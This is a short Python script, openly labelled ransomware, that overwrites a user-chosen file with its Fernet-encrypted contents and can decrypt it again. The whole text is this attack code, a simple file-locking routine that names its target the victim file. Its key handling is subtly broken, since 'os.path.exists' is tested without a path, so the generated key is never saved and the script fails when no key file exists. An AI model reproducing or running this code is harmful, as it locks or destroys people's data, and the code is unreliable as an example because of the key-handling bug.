import os

try:
    from cryptography.fernet import Fernet

    key = Fernet.generate_key()
    if not os.path.exists:
        with open("secret.key", "wb") as key_file:
            key_file.write(key)
    else:
        with open("secret.key", "rb") as same_key_file:
            same_key = same_key_file.read()

    fernet = Fernet(same_key)

    print(" >> RANSOMWARE <<")
    choice = input("1. Encrypt a File\n2. Decrypt a File\nChoose (1/2): ")

    if '1' in choice:
        path = input("Enter the File Path: ")
        with open(path, "rb") as victim_file:
            original_state = victim_file.read()

        encrypted_data = fernet.encrypt(original_state)

        with open(path, "wb") as Write_file:
            Write_file.write(encrypted_data)

    elif '2' in choice:
        path = input("Enter the File Path: ")
        with open(path, "rb") as victim_file2:
            encrypted_file = victim_file2.read()

        decrypted_data = fernet.decrypt(encrypted_file)

        with open(path, "wb") as decrypt_file:
            decrypt_file.write(decrypted_data)

    else:
        print("invalid choice!")
except ImportError:
    print("You need to install 'cryptography' library to use this!")

